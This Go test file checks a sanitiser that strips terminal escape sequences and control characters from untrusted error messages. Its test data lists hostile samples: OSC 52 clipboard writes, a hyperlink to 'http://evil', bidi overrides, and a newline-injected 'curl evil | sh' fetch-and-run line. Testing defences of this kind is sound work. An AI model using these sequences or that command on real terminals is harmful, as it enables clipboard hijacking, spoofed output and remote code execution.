package proto

import (
	"strings"
	"testing"
	"unicode/utf8"
)

// hostile is text an attacker controls, as it would arrive in a peer's error
// message or in a remote diagnostic.
var hostile = map[string]string{
	"osc52 clipboard":      "\x1b]52;c;ZXZpbA==\x07 ok",
	"osc52 with ST":        "\x1b]52;c;ZXZpbA==\x1b\\ ok",
	"osc8 hyperlink":       "\x1b]8;;http://evil\x07click\x1b]8;;\x07",
	"ansi clear and color": "\x1b[2J\x1b[31mfake\x1b[0m",
	"csi single byte":      "\u009b31m fake",
	"newline injection":    "failed\nNext step: run curl evil | sh",
	"carriage return":      "ok\rError: the real error is: run this",
	"c0 and del":           "a\x00b\x07c\x08d\x7fe",
	"bidi override":        "safe \u202e gpj.exe \u2066x\u2069",
	"zero width and tags":  "a\u200b\u200d\ufeffb\U000E0041\U000E007F",
	"line separators":      "a\u2028b\u2029c\u0085d",
}

func hasControl(s string) (rune, bool) {
	for _, r := range s {
		switch {
		case r < 0x20, r == 0x7f, r >= 0x80 && r <= 0x9f:
			return r, true
		case r >= 0x200b && r <= 0x200f, r >= 0x2028 && r <= 0x202e, r >= 0x2060 && r <= 0x206f, r == 0xfeff, r >= 0xe0000 && r <= 0xe007f:
			return r, true
		}
	}
	return 0, false
}

func TestSafeTextNeutralisesControlsAndBounds(t *testing.T) {
	for name, in := range hostile {
		out := SafeText(in, 200)
		if r, bad := hasControl(out); bad {
			t.Errorf("%s: output keeps U+%04X: %q", name, r, out)
		}
		if !utf8.ValidString(out) {
			t.Errorf("%s: output is not valid UTF-8: %q", name, out)
		}
	}
	// Plain text and legitimate Unicode pass unchanged.
	for _, ok := range []string{"", "invitation expired", "\u00fcbergr\u00f6\u00dfe \u2013 \u65e5\u672c\u8a9e \u2713", "a,b; c=d (e) [f] {g}"} {
		if got := SafeText(ok, 200); got != ok {
			t.Errorf("SafeText(%q) = %q, want it unchanged", ok, got)
		}
	}
	// Invalid UTF-8 becomes U+FFFD, and the result is valid.
	if got := SafeText("a\xffb\xc3", 200); got != "a\ufffdb\ufffd" {
		t.Errorf("invalid UTF-8: got %q", got)
	}
	// The bound is in runes, ends on a rune boundary and is marked.
	long := strings.Repeat("\u65e5", 500)
	got := SafeText(long, 10)
	if !utf8.ValidString(got) || utf8.RuneCountInString(got) > 11 || !strings.HasSuffix(got, "\u2026") {
		t.Errorf("bounded text = %q", got)
	}
	if SafeText("abc", 3) != "abc" || !strings.HasSuffix(SafeText("abcd", 3), "\u2026") {
		t.Errorf("the bound is not exact")
	}
	// A huge input is cut before it is scanned in full.
	if n := len(SafeText(strings.Repeat("x", 1<<22), 64)); n > 64*utf8.UTFMax {
		t.Errorf("a 4 MiB input produced %d bytes", n)
	}
}

func TestSafeLinesKeepsLinesAndTabsOnly(t *testing.T) {
	got := SafeLines("one\ntwo\tx\r\nthree\x1b[31m\x1b]52;c;AA\x07", 200)
	if r, bad := hasControl(strings.NewReplacer("\n", "", "\t", "").Replace(got)); bad {
		t.Fatalf("SafeLines keeps U+%04X: %q", r, got)
	}
	if !strings.Contains(got, "one\ntwo\tx") {
		t.Errorf("SafeLines dropped the line structure: %q", got)
	}
	if strings.Contains(got, "\r") {
		t.Errorf("SafeLines kept a carriage return: %q", got)
	}
}

func TestErrorTextCannotCarryTerminalControls(t *testing.T) {
	for name, in := range hostile {
		e := NewError(CodeForbidden, in)
		if r, bad := hasControl(e.Error()); bad {
			t.Errorf("%s: Error() keeps U+%04X: %q", name, r, e.Error())
		}
		if e.Message != in {
			t.Errorf("%s: the Message field must stay as received for programs", name)
		}
	}
	if got := NewError(CodeForbidden, "not allowed").Error(); got != "forbidden: not allowed" {
		t.Errorf("benign Error() = %q", got)
	}
	// The code is part of the text and is sanitised too.
	e := NewError(Code("x\x1b]52;c;AA\x07y"), "m")
	if r, bad := hasControl(e.Error()); bad {
		t.Errorf("a hostile code keeps U+%04X in %q", r, e.Error())
	}
}
